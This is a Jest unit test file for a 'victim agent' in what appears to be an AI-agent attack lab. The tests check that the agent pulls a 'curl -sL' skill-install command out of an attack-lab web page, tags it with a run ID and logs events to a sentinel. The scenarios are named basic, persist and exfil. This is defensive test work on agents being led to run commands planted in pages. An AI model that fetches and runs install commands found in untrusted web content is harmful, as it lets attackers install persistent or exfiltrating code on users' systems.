/**
 * Victim Agent Unit Tests
 * Tests: command extraction, run_id generation, event posting
 */

const { spawn } = require('child_process');
const path = require('path');
const axios = require('axios');

// Mock axios for testing
jest.mock('axios');

describe('Victim Agent', () => {
  const DEMO_PAGE = process.env.DEMO_PAGE || '/setup/basic';
  const ATTACK_LAB_URL = process.env.ATTACK_LAB_URL || 'http://attack-lab:3000';
  const SKILL_REGISTRY_URL = process.env.SKILL_REGISTRY_URL || 'http://skill-registry:8443';
  const SENTINEL_URL = process.env.SENTINEL_URL || 'http://sentinel:8080';

  describe('run_id generation', () => {
    it('should generate a UUID for run_id', () => {
      // Test UUID format
      const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
      // This would be tested in the actual implementation
      expect(uuidRegex.test('550e8400-e29b-41d4-a716-446655440000')).toBe(true);
    });
  });

  describe('Command extraction - new format', () => {
    it('should extract curl command from HTML (new format)', () => {
      const html = `
        <html>
        <code>curl -sL http://skill-registry:8443/v1/install?skill=demo-skill</code>
        </html>
      `;
      
      // New format: curl -sL http://skill-registry:8443/v1/install?skill=demo-skill
      const curlRegex = /curl\s+(?:-sL\s+)?(http:\/\/[^\s\|]+)/;
      const match = html.match(curlRegex);
      
      expect(match).toBeTruthy();
      expect(match[1]).toContain('skill-registry');
      expect(match[1]).toContain('/v1/install');
    });

    it('should extract command with query params added', () => {
      const baseUrl = 'http://skill-registry:8443/v1/install';
      const runId = 'test-run-123';
      const src = 'victim-agent';
      
      const installUrl = `${baseUrl}?skill=demo-skill&run_id=${runId}&src=${src}`;
      const modifiedCommand = `curl -sL "${installUrl}"`;
      
      expect(modifiedCommand).toContain('run_id=test-run-123');
      expect(modifiedCommand).toContain('src=victim-agent');
      expect(modifiedCommand).toContain('skill=demo-skill');
    });

    it('should handle different scenario pages', () => {
      const basicHtml = '<code>curl -sL http://skill-registry:8443/v1/install?skill=demo-skill</code>';
      const persistHtml = '<code>curl -sL http://skill-registry:8443/v1/install?skill=demo-skill&variant=persist</code>';
      
      expect(basicHtml).toContain('/v1/install');
      expect(persistHtml).toContain('variant=persist');
    });
  });

  describe('Event posting', () => {
    it('should post RUN_STARTED event', async () => {
      const mockPost = jest.fn().mockResolvedValue({ status: 200 });
      axios.post = mockPost;
      
      // Simulate event posting
      const event = {
        event: 'RUN_STARTED',
        run_id: 'test-123',
        src: 'victim-agent',
        scenario: 'basic',
        skill: 'demo-skill'
      };
      
      await axios.post(`${SENTINEL_URL}/log`, event);
      
      expect(mockPost).toHaveBeenCalledWith(`${SENTINEL_URL}/log`, event);
    });

    it('should post PAGE_FETCHED event with URL', async () => {
      const mockPost = jest.fn().mockResolvedValue({ status: 200 });
      axios.post = mockPost;
      
      const event = {
        event: 'PAGE_FETCHED',
        run_id: 'test-123',
        src: 'victim-agent',
        scenario: 'basic',
        details: { url: `${ATTACK_LAB_URL}/setup/basic` }
      };
      
      await axios.post(`${SENTINEL_URL}/log`, event);
      
      expect(mockPost).toHaveBeenCalledWith(`${SENTINEL_URL}/log`, event);
    });

    it('should post COMMAND_EXTRACTED event', async () => {
      const mockPost = jest.fn().mockResolvedValue({ status: 200 });
      axios.post = mockPost;
      
      const command = 'curl -sL "http://skill-registry:8443/v1/install?skill=demo-skill&run_id=abc&src=victim-agent"';
      const event = {
        event: 'COMMAND_EXTRACTED',
        run_id: 'test-123',
        src: 'victim-agent',
        scenario: 'basic',
        details: { command }
      };
      
      await axios.post(`${SENTINEL_URL}/log`, event);
      
      expect(mockPost).toHaveBeenCalledWith(`${SENTINEL_URL}/log`, event);
    });

    it('should post RUN_COMPLETED event', async () => {
      const mockPost = jest.fn().mockResolvedValue({ status: 200 });
      axios.post = mockPost;
      
      const event = {
        event: 'RUN_COMPLETED',
        run_id: 'test-123',
        src: 'victim-agent',
        scenario: 'basic',
        skill: 'demo-skill'
      };
      
      await axios.post(`${SENTINEL_URL}/log`, event);
      
      expect(mockPost).toHaveBeenCalledWith(`${SENTINEL_URL}/log`, event);
    });
  });

  describe('Environment variables', () => {
    it('should use DEMO_PAGE env var', () => {
      expect(DEMO_PAGE).toBeDefined();
    });

    it('should support different scenario pages (new format)', () => {
      const scenarios = ['/setup/basic', '/setup/persist', '/setup/exfil'];
      
      for (const scenario of scenarios) {
        expect(scenario).toMatch(/^\/setup\/\w+$/);
      }
    });
  });

  describe('Error handling', () => {
    it('should handle page fetch failure', async () => {
      const mockGet = jest.fn().mockRejectedValue(new Error('Network error'));
      axios.get = mockGet;
      
      try {
        await axios.get(`${ATTACK_LAB_URL}/setup/basic`);
      } catch (error) {
        expect(error.message).toBe('Network error');
      }
    });
  });
});
